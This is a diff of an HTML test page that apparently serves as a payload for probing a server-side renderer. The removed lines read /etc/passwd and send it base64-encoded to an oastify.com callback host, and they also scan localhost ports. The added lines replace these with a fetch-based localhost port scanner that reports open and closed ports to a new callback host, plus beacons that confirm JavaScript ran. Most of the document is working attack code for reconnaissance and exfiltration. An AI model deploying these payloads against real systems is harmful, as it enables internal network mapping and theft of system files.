@@ -7,17 +7,24 @@
 </head>
 <body>
     This website is for testing
-    <img src=https://fyhg2n72ai0pok2v0llxwj7kibo4cu0j.oastify.com?isanormalimage/>
+    <img src=https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com?isanormalimage/>
     
-<img src=x onerror="fetch('file:///etc/passwd')
-  .then(r => r.text())
-  .then(d => new Image().src='https://fyhg2n72ai0pok2v0llxwj7kibo4cu0j.oastify.com/exfil?file='+btoa(d))">
+<script>
+let ports = [21, 22, 80, 443, 3306, 5000, 8080, 8443];
 
-    <img src=x onerror="
-['21','22','80','443','3306','5000','8080','8443'].forEach(p=>{
-  f=new Image();f.src='http://127.0.0.1:'+p;
-  f.onerror=()=>{new Image().src='https://fyhg2n72ai0pok2v0llxwj7kibo4cu0j.oastify.com/open?port='+p;}
-})">
+ports.forEach(port => {
+  fetch("http://127.0.0.1:" + port, {mode: 'no-cors'})
+    .then(() => {
+      new Image().src = "https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com/open?port=" + port;
+    })
+    .catch(() => {
+      new Image().src = "https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com/closed?port=" + port;
+    });
+});
+</script>
+
+
+    <img src=x onerror="fetch("https://1fh2j9oor4hb56jhh72jd5o6zx5qthh6.oastify.com/javascriptisExcuted=true", { mode: "no-cors" });">
 
 
   
